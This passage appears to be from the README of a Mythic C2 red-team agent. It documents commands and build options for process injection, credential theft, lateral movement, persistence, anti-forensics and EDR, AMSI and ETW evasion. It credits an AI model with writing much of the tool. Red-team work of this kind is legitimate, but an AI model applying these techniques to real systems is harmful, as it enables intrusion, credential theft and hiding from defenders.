ptrace-inject | `ptrace-inject -action <check\|inject> [-pid <PID>] [-filename <shellcode>] [-restore <true>] [-timeout <30>]` | **(Linux only, x86_64)** Process injection via ptrace — PTRACE_ATTACH/POKETEXT/SETREGS with register and code restore. Check mode reports ptrace_scope, capabilities, and candidates (T1055.008).
pty | `pty [-shell /bin/bash] [-rows 24] [-cols 80]` | **(Linux/macOS)** Start an interactive PTY shell session via Mythic's interactive tasking. Full terminal emulation with bidirectional I/O (T1059).
pwd | `pwd` | Print working directory.
read-memory | `read-memory <dll_name> <function_name> <start_index> <num_bytes>` | **(Windows only)** Read bytes from a DLL function address.
reg | `reg -action <read\|write\|delete\|search\|save\|creds> [-hive HKLM] [-path ...] [...]` | **(Windows only)** Unified registry operations — read, write, delete, search, and save hives (T1012, T1112, T1003.002).
remote-reg | `remote-reg -action <query\|enum\|set\|delete> -server <host> -username <user> [-password <pass>\|-hash <NT>] [-hive HKLM] [-path ...] [-name <val>]` | Read/write registry on remote Windows hosts via WinReg RPC over SMB named pipes. Supports pass-the-hash. Cross-platform (T1012, T1112, T1021.002).
remote-service | `remote-service -action <list\|query\|create\|start\|stop\|delete> -server <host> -username <user> [-password <pass>\|-hash <NT>] [-name <svc>] [-binpath <path>]` | Manage services on remote Windows hosts via SVCCTL RPC over SMB named pipes. Create/start for lateral movement, list/query for recon. Supports pass-the-hash. Cross-platform (T1569.002, T1543.003, T1007).
rev2self | `rev2self` | **(Windows only)** Revert to the original security context by dropping any active impersonation token.
route | `route [-destination <IP>] [-gateway <IP>] [-interface <name>]` | Display the system routing table with optional filtering. Windows: GetIpForwardTable API, Linux: /proc/net/route + IPv6, macOS: netstat -rn. Cross-platform (T1016).
rpfwd | `rpfwd start <port> <remote_ip> <remote_port>` / `rpfwd stop <port>` | Reverse port forward -- agent listens, Mythic routes to target. Cross-platform (T1090).
rm | `rm <path>` | Remove a file or directory (recursively removes directories).
run | `run <command>` | Execute a shell command and return the output.
runas | `runas -command <cmd> -username <user> -password <pass> [-domain <domain>] [-netonly true]` | Execute a command as a different user. Windows: CreateProcessWithLogonW (supports /netonly). Linux/macOS: setuid as root, or sudo -S with password. Cross-platform (T1134.002).
schtask | `schtask -action <create\|query\|delete\|run\|list\|enable\|disable\|stop> -name <name> [-program <path>] [-filter <substring>]` | **(Windows only)** Manage Windows scheduled tasks via COM API. List action supports name filtering.
screenshot | `screenshot` | Capture a screenshot of the current desktop session. Uploads as PNG. Windows: GDI multi-monitor capture. macOS: screencapture. Linux: auto-detects X11/Wayland tools (import, scrot, gnome-screenshot, grim). Cross-platform (T1113).
secret-scan | `secret-scan [-path /home/user] [-depth 5] [-max_results 100]` | Search files for secrets, API keys, private keys, connection strings, and sensitive patterns. 27 regex patterns (AWS, GitHub, Slack, Stripe, Vault, DigitalOcean, Shopify, Databricks, etc.) with value redaction. Depth-limited directory walk, skips noise dirs. Cross-platform (T1552.001, T1005).
secure-delete | `secure-delete -path <file_or_dir> [-passes <n>]` | Securely delete files by overwriting with random data before removal. Configurable passes (default 3), recursive directory support. Prevents forensic recovery. Cross-platform (T1070.004).
security-info | `security-info` | Report security posture and active controls. SELinux/AppArmor/seccomp/ASLR (Linux), SIP/Gatekeeper/FileVault (macOS), Defender/UAC/Credential Guard/BitLocker (Windows). Cross-platform (T1082, T1518.001).
share-hunt | `share-hunt -hosts <IPs/CIDRs> -username <DOMAIN\user> -password <pass> [-hash <NTLM>] [-depth <n>] [-filter <all\|credentials\|configs\|code>]` | Crawl SMB shares across multiple hosts for sensitive files — credentials, configs, scripts. Recursive directory search with pass-the-hash support. Cross-platform (T1135, T1039).
smb | `smb -action <shares\|ls\|cat\|upload\|rm\|mkdir\|mv> -host <target> -username <user> [-password <pass>] [-hash <NT hash>] [-share <name>] [-path <path>] [-destination <path>]` | SMB2 file operations on remote shares — list shares, browse directories, read/write/delete files, create directories, rename/move files. NTLM auth with pass-the-hash support. Cross-platform (T1021.002, T1550.002).
service | `service -action <query\|start\|stop\|restart\|create\|delete\|list\|enable\|disable> -name <name> [-binpath <path>]` | **(Windows, Linux, macOS)** Manage services — Windows via SCM API, Linux via systemd unit files, macOS via launchd plists. Create/delete for persistence, query/list/start/stop/restart/enable/disable for management (T1543.002, T1543.003, T1543.004, T1562.001).
setenv | `setenv -action <set\|unset> -name <NAME> [-value <VALUE>]` | Set or unset environment variables in the agent process. Cross-platform.
shell-config | `shell-config -action <history\|list\|read\|inject\|remove> [-file <.bashrc>] [-line <cmd>] [-lines <count>]` | Read shell history, list/read/inject/remove shell config files. Linux/macOS: bashrc/zshrc (T1546.004). Windows: PowerShell profiles (T1546.013). Also harvests shell history (T1552.003).
sleep | `sleep [seconds] [jitter] [working_start] [working_end] [working_days]` | Set callback interval, jitter, and working hours. Working hours restrict check-ins to specified times/days for opsec.
socks | `socks start [port]` / `socks stop [port]` | Start or stop a SOCKS5 proxy through the callback. Default port 7000. Tunnel tools like proxychains, nmap, or Impacket through the agent.
sort | `sort -path <file> [-reverse true] [-numeric true] [-unique true]` | Sort lines of a file. Supports alphabetic, numeric, reverse, and unique modes. Cross-platform (T1083).
spawn | `spawn -path <exe> [-ppid <pid>] [-blockdlls true]` | **(Windows only)** Spawn a suspended process or thread for injection. Supports PPID spoofing (T1134.004) and non-Microsoft DLL blocking.
spray | `spray -action <kerberos\|ldap\|smb> -server <DC> -domain <DOMAIN> -users <user1\nuser2> [-password <pass>] [-hash <NT hash>] [-delay <ms>] [-jitter <0-100>]` | Password spray against AD via Kerberos pre-auth, LDAP bind, or SMB auth. SMB supports pass-the-hash. Lockout-aware with configurable delay/jitter. Cross-platform (T1110.003, T1550.002).
ssh | `ssh -host <target> -username <user> [-password <pass>] [-key_path <path>] [-key_data <pem>] -command <cmd>` | Execute commands on remote hosts via SSH. Password, key file, or inline key auth. Cross-platform lateral movement (T1021.004).
ssh-agent | `ssh-agent [-action <list\|enum>] [-socket /path/to/agent.sock]` | **(Linux/macOS only)** Enumerate SSH agent sockets and list loaded keys. Discovers SSH_AUTH_SOCK, scans /tmp/ssh-*, /run/user/*, GNOME keyring. Reports key fingerprints to credential vault (T1552.004).
ssh-keys | `ssh-keys -action <list\|add\|remove\|read-private\|enumerate> [-key <ssh_key>] [-user <username>]` | **(Linux/macOS only)** Read or inject SSH authorized_keys. Read private keys. Enumerate SSH config/known_hosts for lateral movement targets.
stat | `stat -path <file_or_dir>` | Display file/directory metadata: type, size, permissions, timestamps. Platform-specific details — inode/owner (Linux/macOS), file attributes (Windows). Symlink-aware via Lstat. Cross-platform (T1083).
strings | `strings -path <file> [-min_length <n>] [-pattern <text>] [-offset <bytes>] [-max_size <bytes>]` | Extract printable ASCII strings from files. Find embedded text, URLs, credentials in binaries. Pattern filter, min length control, offset/max_size. Cross-platform (T1005).
start-clr | `start-clr` | **(Windows only)** Initialize the CLR v4.0.30319 with optional AMSI/ETW patching (Ret Patch, Autopatch, or Hardware Breakpoint).
systemd-persist | `systemd-persist -action <install\|remove\|list> -name <unit> [-exec_start <cmd>] [-timer <calendar>] [-system true]` | **(Linux only)** Install, remove, or list systemd service/timer persistence. User or system scope. MITRE T1543.002.
steal-token | `steal-token <pid>` | **(Windows only)** Steal and impersonate a security token from another process.
token-store | `token-store -action <save\|list\|use\|remove> -name <label>` | **(Windows only)** Named token vault — save, list, restore, and remove impersonation tokens. Enables quick switching between stolen/created identities without re-stealing (T1134.001).
suspend | `suspend -action <suspend\|resume> -pid <PID>` | Suspend or resume a process. Tactical EDR/AV pause during sensitive ops. Windows: NtSuspendProcess/NtResumeProcess. Linux/macOS: SIGSTOP/SIGCONT. Cross-platform (T1562.001).
sysinfo | `sysinfo` | Comprehensive system information: OS version, hardware, memory, uptime, domain, .NET (Windows), SELinux/SIP status. Cross-platform (T1082).
sysmon-config | `sysmon-config [-action check\|rules\|events]` | **(Windows only)** Detect Sysmon installation and extract configuration — service/driver status, hash algorithm, options flags, rule data size, event channels. Detects renamed installations via minifilter altitude (T1518.001, T1562.001).
tac | `tac -path <file>` | Print file lines in reverse order. Useful for viewing logs newest-to-oldest. Cross-platform (T1083).
tail | `tail -path <file> [-lines <N>] [-head true] [-bytes <N>]` | Read first or last N lines/bytes of a file without transferring entire contents. Ring buffer for efficient tail, reverse-seek for large files. Cross-platform (T1005, T1083).
tcc-check | `tcc-check [-service <filter>]` | **(macOS only)** Enumerate TCC (Transparency, Consent, and Control) permissions. Discover which apps have camera, microphone, screen recording, full disk access. Groups by service with allowed summary (T1082).
touch | `touch -path <file> [-mkdir true]` | Create an empty file or update existing file timestamps. Optional parent directory creation. Cross-platform (T1106).
thread-hijack | `thread-hijack -pid <PID> [-tid <TID>]` | **(Windows only)** Inject shellcode via thread execution hijacking — suspend existing thread, redirect RIP to shellcode, resume. Avoids CreateRemoteThread detection (T1055.003).
threadless-inject | `threadless-inject` | **(Windows only)** Inject shellcode using threadless injection by hooking a DLL function in a remote process. More stealthy than vanilla injection as it doesn't create new threads.
ticket | `ticket -action forge\|request\|s4u -realm <DOMAIN> -username <user> -key <hex_key> [-key_type aes256\|aes128\|rc4] [-format kirbi\|ccache] [-domain_sid <SID>] [-spn <SPN>] [-server <KDC>] [-impersonate <user>]` | Forge, request, or delegate Kerberos tickets. Forge: Golden/Silver Tickets (offline). Request: Overpass-the-Hash (online). S4U: constrained delegation abuse via S4U2Self+S4U2Proxy. Cross-platform (T1558.001, T1558.002, T1550.002, T1134.001).
tr | `tr -path <file> -from [:lower:] -to [:upper:]` | Translate, squeeze, or delete characters in file content. Supports character classes and ranges. Cross-platform (T1083).
triage | `triage -action <all\|documents\|credentials\|configs\|recent\|custom> [-path <dir>] [-hours <n>] [-max_size <bytes>] [-max_files <n>]` | Find high-value files for exfiltration — documents, credentials, configs, recently modified files, or custom path scan. Platform-aware search paths. Cross-platform (T1083, T1005).
trust | `trust -server <DC> -username <user@domain> -password <pass> [-use_tls]` | Enumerate domain/forest trusts via LDAP with forest topology, transitivity analysis, encryption strength, and attack path identification. Cross-platform (T1482).
timestomp | `timestomp -action <get\|copy\|set\|match\|random> -target <file> [-source <file>] [-timestamp <time>]` | Modify file timestamps to blend in. Get, copy from another file, set specific time, match directory neighbors (IQR), or random within range. Windows also modifies creation time.
tscon | `tscon [-action <list\|hijack\|disconnect\|logoff>] [-session_id <id>]` | **(Windows only)** RDP session management — list, hijack, disconnect, or logoff sessions. Session takeover without credentials (T1563.002).
ts | `ts [-a] [-i PID]` | **(Windows only)** List threads in processes. By default shows only alertable threads (Suspended/DelayExecution). Use -a for all threads, -i to filter by PID (T1057).
uac-bypass | `uac-bypass [-technique fodhelper\|computerdefaults\|sdclt] [-command <path>]` | **(Windows only)** Bypass UAC to escalate from medium to high integrity. Registry-based hijack + auto-elevating binary. Default spawns elevated callback (T1548.002).
uniq | `uniq -path <file> [-count true] [-duplicate true] [-unique_only true]` | Filter or count duplicate consecutive lines in a file. Count mode sorts by frequency. Cross-platform (T1083).
unlink | `unlink -connection_id <uuid>` | Disconnect a linked TCP P2P agent. Cross-platform (T1572).
uptime | `uptime` | Show system uptime, boot time, and load averages. Cross-platform (T1082).
upload | `upload` | Upload a file to the target with chunked file transfer.
usn-jrnl | `usn-jrnl -action query\|recent\|delete [-volume C:]` | **(Windows only)** Query or delete NTFS USN Change Journal — destroys file operation history for anti-forensics (T1070.004).
vanilla-injection | `vanilla-injection` | **(Windows only)** Inject shellcode into a remote process using VirtualAllocEx/WriteProcessMemory/CreateRemoteThread.
vm-detect | `vm-detect` | Detect VM/hypervisor environment (VMware, VirtualBox, Hyper-V, QEMU/KVM, Xen, Parallels). Checks MAC OUI, DMI/SMBIOS, VM tools, SCSI, CPU hypervisor flag. Cross-platform (T1497.001).
vss | `vss -action <list\|create\|delete\|extract> [-volume C:\\] [-id <device_path>] [-source <path>] [-dest <path>]` | **(Windows only)** Manage Volume Shadow Copies — list, create, delete, extract files. Extract locked files (NTDS.dit, SAM) without touching lsass. MITRE T1003.003.
watch-dir | `watch-dir -path <dir> [-interval 5] [-duration 300] [-depth 3] [-pattern *.docx] [-hash true]` | Monitor a directory for file system changes — detects new, modified, and deleted files via polling. Supports glob filtering and MD5 hash detection. Cross-platform (T1083, T1119).
wc | `wc -path <file_or_dir> [-pattern <glob>]` | Count lines, words, characters, and bytes in files. Directory mode with glob pattern filtering and totals. Cross-platform (T1083).
wdigest | `wdigest -action <status\|enable\|disable>` | **(Windows only)** Manage WDigest plaintext credential caching. Enable to capture cleartext passwords at next logon. MITRE T1003.001, T1112.
winrm | `winrm -host <target> -username <user> [-password <pass>] [-hash <NT hash>] -command <cmd> [-shell cmd\|powershell]` | Execute commands on remote Windows hosts via WinRM with NTLM authentication. Supports pass-the-hash, cmd.exe and PowerShell. Cross-platform (T1021.006, T1550.002).
windows | `windows [-action list\|search] [-filter <string>] [-all]` | **(Windows only)** Enumerate visible application windows — shows HWND, PID, process name, window class, and title. Search filters by title/process/class. MITRE T1010.
who | `who [-all true]` | Show currently logged-in users and active sessions. Linux: parses utmp. Windows: WTS API. macOS: who command. Cross-platform (T1033).
whoami | `whoami` | Display current user identity and security context. Windows: username, SID, token type, integrity level, group memberships, privileges. Linux: user, UID, GID, groups, effective capabilities (decoded), SELinux/AppArmor context, container detection. macOS: user, UID, GID, groups.
wmi | `wmi -action <execute\|query\|process-list\|os-info> [-target <host>] [-command <cmd>] [-query <wql>]` | **(Windows only)** Execute WMI queries and process creation via COM API.
wmi-persist | `wmi-persist -action <install\|remove\|list> -name <id> -trigger <logon\|startup\|interval\|process> -command <exe>` | **(Windows only)** WMI Event Subscription persistence via COM API. Fileless, survives reboots. MITRE T1546.003.
wlan-profiles | `wlan-profiles [-name <SSID>]` | Recover saved WiFi network profiles and credentials. Windows: WLAN API, Linux: NetworkManager/wpa_supplicant/iwd, macOS: Keychain. Cross-platform (T1555).
write-file | `write-file -path <file> -content <text> [-base64 true] [-append true] [-mkdir true]` | Write text or base64-decoded content to a file. Create, overwrite, or append without spawning subprocesses. Cross-platform (T1105).
write-memory | `write-memory <dll_name> <function_name> <start_index> <hex_bytes>` | **(Windows only)** Write bytes to a DLL function address.
xattr | `xattr -action <list\|get\|set\|delete> -path <file> [-name <attr>] [-value <data>] [-hex true]` | **(Linux/macOS only)** Manage extended file attributes — list, get, set, delete. Unix complement to Windows ADS for data hiding (T1564.004).

## Injection Techniques

### PoolParty Injection

| Variant | Technique | Trigger | Go Shellcode |
|---------|-----------|---------|--------------|
| 1 | Worker Factory Start Routine Overwrite | New worker thread creation | No |
| 2 | TP_WORK Insertion | Task queue processing | Yes |
| 3 | TP_WAIT Insertion | Event signaling | Yes |
| 4 | TP_IO Insertion | File I/O completion | Yes |
| 5 | TP_ALPC Insertion | ALPC port messaging | Yes |
| 6 | TP_JOB Insertion | Job object assignment | Yes |
| 7 | TP_DIRECT Insertion | I/O completion port | Yes |
| 8 | TP_TIMER Insertion | Timer expiration | Yes |

### Opus Injection

| Variant | Technique | Target | Go Shellcode |
|---------|-----------|--------|--------------|
| 1 | Ctrl-C Handler Chain | Console processes only | No |
| 4 | PEB KernelCallbackTable | GUI processes only | Yes |

For detailed variant descriptions, see [Injection Technique Details](research/injection-techniques.md).

## Build Options

### Binary Inflation

Fawkes supports optional binary inflation at build time. This embeds a block of repeated bytes into the compiled agent, which can be used to increase file size or lower entropy scores.

Two build parameters control this:
- **inflate_bytes** - Hex bytes to embed (e.g. `0x90` or `0x41,0x42`)
- **inflate_count** - Number of times to repeat the byte pattern

The byte pattern is repeated `inflate_count` times, so the total added size is `length(byte_pattern) * inflate_count`.

**Quick reference for sizing:**

| inflate_count | Single byte (e.g. `0x90`) | Two bytes (e.g. `0x41,0x42`) |
|---------------|---------------------------|------------------------------|
| 1,000 | 1 KB | 2 KB |
| 10,000 | 10 KB | 20 KB |
| 100,000 | 100 KB | 200 KB |
| 1,000,000 | 1 MB | 2 MB |
| 3,000,000 | 3 MB | 6 MB |
| 10,000,000 | 10 MB | 20 MB |

When inflation is not configured, only 1 byte of overhead is added to the binary.

## Opsec Features

### Artifact Tracking

Fawkes automatically registers artifacts with Mythic for opsec-relevant commands. Artifacts appear in the Mythic UI under the **Artifacts** tab, giving operators a clear picture of all forensic indicators generated during an engagement.

Tracked artifact types:

| Type | Commands |
|------|----------|
| Process Create | run, powershell, spawn, argue |
| API Call | net-enum, net-user, service, wmi, schtask, procdump, hashdump, eventlog, ntdll-unhook, syscalls, firewall, dcom, vss (create/delete), psexec |
| Process Kill | kill |
| Process Inject | vanilla-injection, apc-injection, threadless-inject, poolparty-injection, opus-injection, module-stomping, thread-hijack |
| File Write | upload, cp, mv |
| File Create | mkdir |
| File Delete | rm |
| File Modify | timestomp |
| Registry Write | reg (write/delete), remote-reg (set/delete), persist (registry, com-hijack, screensaver methods), uac-bypass, defender (add/remove-exclusion) |
| Registry Save | reg (save/creds) |
| Remote Registry | remote-reg (query/enum/set/delete via WinReg RPC) |
| Remote Service | remote-service (list/query/create/start/stop/delete via SVCCTL RPC) |
| Logon | make-token |
| Token Steal | steal-token, getsystem |

Read-only commands (ls, ps, cat, env, etc.) do not generate artifacts.

### Credential Vault Integration

Credential-harvesting commands automatically report discoveries to Mythic's **Credentials** store, making them searchable and exportable from the Mythic UI.

| Command | Credential Type | What's Reported |
|---------|----------------|-----------------|
| hashdump | hash | SAM NTLM hashes (Windows), /etc/shadow hashes (Linux), PBKDF2 hashes (macOS) |
| kerberoast | hash | TGS tickets for offline cracking |
| asrep-roast | hash | AS-REP hashes |
| dcsync | hash | NTLM + AES keys via DRSGetNCChanges |
| lsa-secrets | plaintext/hash/key | Service passwords, cached creds, DPAPI keys |
| laps | plaintext | LAPS v1 & v2 passwords |
| gpp-password | plaintext | GPP encrypted passwords from SYSVOL |
| browser | plaintext | Chrome/Edge/Firefox saved passwords, cookies, history, autofill, bookmarks |
| dpapi | plaintext/hash | DPAPI-protected secrets |
| credman | plaintext | Credential Manager entries (on dump action) |
| make-token | plaintext | Credentials used for token creation |
| cred-harvest | hash/plaintext/token | Shadow hashes, cloud env vars, sensitive env vars, M365 OAuth/JWT tokens |
| credential-prompt | plaintext | Dialog-captured credentials (macOS/Windows/Linux) |

### Keylog Tracking

The `keylog` command integrates with Mythic's **Keylogs** feature. When keystrokes are returned via `stop` or `dump`, they are automatically parsed by window title and sent to Mythic's keylog tracker with user attribution. Keylogs are searchable in the Mythic UI by window title, user, or keystroke content.

### Token Tracking

The `make-token` and `steal-token` commands register tokens with Mythic's **Callback Tokens** tracker. This provides visibility into which tokens are associated with each callback, including the impersonated user identity and source process. The `rev2self` command automatically removes tracked tokens when impersonation is dropped.

### TLS Certificate Verification

Control how the agent validates HTTPS certificates when communicating with the C2 server. Configured at build time via the **tls_verify** parameter:

| Mode | Description |
|------|-------------|
| `none` | Skip all TLS verification (default, backward compatible) |
| `system-ca` | Validate certificates against the OS trust store |
| `pinned:<sha256>` | Pin to a specific certificate fingerprint (SHA-256 hex). Agent rejects connections if the server cert doesn't match. |

Certificate pinning prevents MITM interception of agent traffic even if an attacker controls a trusted CA.

### TLS Fingerprint Spoofing (JA3)

Go's standard TLS stack produces a distinctive JA3 hash that network security tools can identify as non-browser traffic. The **tls_fingerprint** build parameter uses [uTLS](https://github.com/refraction-networking/utls) to spoof the TLS ClientHello, producing a browser-matching JA3 fingerprint.

| Fingerprint | Description |
|-------------|-------------|
| `chrome` | Chrome/Chromium (default) — most common browser, best for blending |
| `firefox` | Firefox |
| `safari` | Safari |
| `edge` | Microsoft Edge |
| `random` | Randomized fingerprint per connection |
| `go` | No spoofing — use Go's default TLS stack |

### Fallback C2 URLs

Multiple C2 callback URLs with automatic failover. If the primary callback host is unreachable, the agent transparently cycles through fallback URLs before applying backoff.

| Parameter | Description |
|-----------|-------------|
| `fallback_hosts` | Comma-separated fallback C2 hosts (e.g. `http://backup1.example.com,https://backup2.example.com`) |

Same port and encryption as primary. Remembers last successful URL. Works with config vault and XOR obfuscation.

### Environment Keying / Guardrails

Prevent the agent from executing on unauthorized systems. Configured at build time — the agent silently exits before making any network contact if checks fail. No logging, no artifacts, no C2 traffic.

| Parameter | Type | Description |
|-----------|------|-------------|
| `env_key_hostname` | Regex | Hostname must match (e.g., `WORKSTATION-\d+` or `.*\.contoso\.com`) |
| `env_key_domain` | Regex | Domain must match (e.g., `CONTOSO` or `.*\.local`) |
| `env_key_username` | Regex | Username must match (e.g., `admin.*` or `svc_.*`) |
| `env_key_process` | String | Process name that must be running (e.g., `outlook.exe`) |

All patterns are case-insensitive and anchored to match the full value. Multiple keys can be combined — all must pass. Invalid regex patterns fail closed (agent exits). Leave empty to skip a check.

### C2 String Obfuscation

Enable the **obfuscate_strings** build parameter to XOR-encode all C2 config strings (callback host, URIs, user agent, encryption key, UUID) at build time with a per-build random 32-byte key. Prevents trivial IOC extraction via `strings` on the binary. Decoded at runtime. Cross-platform.

### BlockDLLs for Child Processes

Enable the **block_dlls** build parameter to apply `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON` to all child processes spawned by the agent (run, powershell commands). Prevents EDR from injecting monitoring DLLs into spawned processes. Uses `STARTUPINFOEX` with `UpdateProcThreadAttribute`. Windows only.

### Parent PID Spoofing for Subprocesses

Set `config -action set -key default_ppid -value <PID>` at runtime to make all child processes (`run`, `powershell`) appear as children of a legitimate process (e.g., `explorer.exe`). Defeats parent-child process relationship detection by EDR. Combines with BlockDLLs when both are active. Uses `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)`. Disable with `config -action set -key default_ppid -value 0`. Windows only (T1134.004).

### Auto-Patch ETW/AMSI

Enable the **auto_patch** build parameter to automatically patch `EtwEventWrite` and `AmsiScanBuffer` at agent startup. This prevents ETW-based detection and AMSI scanning before any agent activity occurs — no manual command required. Windows only (no-op on Linux/macOS).

### Self-Deletion

Enable automatic binary deletion at startup via the **self_delete** build parameter. Once the agent starts running, it removes its own file from disk — eliminating the primary forensic artifact.

- **Linux/macOS**: Uses `os.Remove()` — the running process continues via the in-memory inode mapping. The file disappears from disk immediately.
- **Windows**: Uses the NTFS stream rename technique — renames the default `:$DATA` stream then deletes the file entry. No child process spawned.

The binary is deleted after environment key checks pass but before network activity begins.

### Process Masquerading (Linux)

Set the **masquerade_name** build parameter to change the agent's process name on Linux. Uses `prctl(PR_SET_NAME)` to modify `/proc/self/comm`, which is displayed by `ps`, `top`, and `htop`. Max 15 characters.

Useful names: `[kworker/0:1]`, `[migration/0]`, `sshd`, `apache2`, `[rcu_preempt]`

Combined with self-delete, the agent appears as a legitimate kernel thread or service with no file on disk.

### Custom HTTP Headers

All headers defined in the Mythic HTTP C2 profile configuration are applied to every request. Beyond `User-Agent` (always supported), operators can add headers like `Accept-Language`, `Referer`, `Cookie`, or `X-Forwarded-For` to blend C2 traffic with legitimate web traffic patterns.

### Domain Fronting

Set the **host_header** build parameter to override the HTTP `Host` header. This enables domain fronting: route traffic through a CDN (e.g., CloudFront, Azure CDN) while the `Host` header targets your actual C2 domain. To network defenders, the traffic appears to go to the CDN's IP address.

### Proxy Support

Set the **proxy_url** build parameter to route agent traffic through an HTTP or SOCKS proxy. Useful for operating in corporate networks with mandatory proxy servers.

Examples: `http://proxy.corp.local:8080`, `socks5://127.0.0.1:1080`

### Build Path Stripping (-trimpath)

All builds use Go's `-trimpath` flag to strip local filesystem paths from the compiled binary. Without this, paths like `/home/user/project/...` and `/go/pkg/mod/...` leak into the binary through panic traces and runtime metadata. Combined with `-s -w` (symbol stripping) and empty `-buildid`, this minimizes forensic information in the binary. Garble builds already handle this; `-trimpath` covers non-garble builds.

### YARA Post-Build Scanning

After compilation, the built payload is automatically scanned against a set of YARA rules that model common defender detection patterns. Results are shown in the Mythic build output as an informational step — the scan **never fails the build**.

Detection categories scanned:
- Go binary identification and symbol leaks
- Leaked build/development paths
- Mythic/C2 framework string indicators
- Windows injection API names
- Credential access API names
- Defense evasion API patterns
- Persistence mechanism strings
- Plaintext C2 configuration

This helps operators understand detection risk and choose appropriate opsec options (garble, obfuscate_strings, etc.) before deploying.

## Supported C2 Profiles

### [HTTP Profile](https://github.com/MythicC2Profiles/http)

The HTTP profile calls back to the Mythic server over the basic, non-dynamic profile. This is the default egress profile — the agent polls Mythic for tasking over HTTP/HTTPS.

### TCP P2P Profile

The TCP profile enables peer-to-peer (P2P) agent linking for internal pivoting. A TCP child agent listens on a port and waits for a parent agent to connect via the `link` command. All tasking and responses are routed through the parent's egress channel (HTTP), so the child never contacts Mythic directly.

**Architecture:**

```
Mythic Server ←──HTTP──→ Egress Agent (HTTP profile)
                              │
                              ├──TCP──→ Child Agent A (TCP profile, port 7777)
                              └──TCP──→ Child Agent B (TCP profile, port 8888)
```

**Build parameters:**

| Parameter | Description | Default |
|-----------|-------------|---------|
| `tcp_bind_address` | Address and port for the child to listen on (e.g., `0.0.0.0:7777`) | _(empty = HTTP mode)_ |

When `tcp_bind_address` is set, the agent starts in TCP listener mode instead of HTTP egress mode. The TCP C2 profile parameters (port, AESPSK, killdate) configure the listener.

**Usage workflow:**

1. Build a **child agent** with the TCP C2 profile and `tcp_bind_address` set (e.g., `0.0.0.0:7777`)
2. Deploy the child to an internal host (no internet access required)
3. From an **egress agent** (HTTP profile), run: `link -host <child_ip> -port 7777`
4. Mythic creates a new callback for the child — all tasking flows through the egress agent
5. To disconnect: `unlink -connection_id <uuid>`

**Encryption:** AES-256-CBC with HMAC-SHA256 (same as HTTP profile). Wire protocol uses 4-byte length-prefixed framing.

**Relink support:** If a parent disconnects (e.g., via `unlink` or parent agent dies), the child agent caches its checkin data and waits for a new parent connection. When a new egress agent runs `link`, the child automatically re-registers with Mythic as a new callback. No manual intervention needed.

**Multiple children:** An egress agent can link to multiple TCP children simultaneously. Each child operates independently with its own callback.

## Thanks
Everything I know about Mythic Agents came from Mythic Docs or stealing code and ideas from the [Merlin](https://github.com/MythicAgents/merlin) and [Freyja](https://github.com/MythicAgents/freyja) agents.

After that, it's been exclusively feeding Claude PoC links and asking for cool stuff. Crazy right?

## Techniques and References
- **Threadless Injection** - [CCob's ThreadlessInject](https://github.com/CCob/ThreadlessInject) (original C# implementation) and [dreamkinn's go-ThreadlessInject](https://github.com/dreamkinn/go-ThreadlessInject) (Go port)
- **sRDI (Shellcode Reflective DLL Injection)** - [Merlin's Go-based sRDI implementation](https://github.com/MythicAgents/merlin), originally based on [Nick Landers' (monoxgas) sRDI](https://github.com/monoxgas/sRDI)
- **PoolParty Injection** - [SafeBreach Labs PoolParty research](https://github.com/SafeBreach-Labs/PoolParty) (original C++ PoC) - [Variant details](research/injection-techniques.md#poolparty-injection)
- **Opus Injection** - Callback-based injection techniques - [Variant details](research/injection-techniques.md#opus-injection)
- Phoenix icon from [OpenClipart](https://openclipart.org/detail/229408/colorful-phoenix-line-art-12)
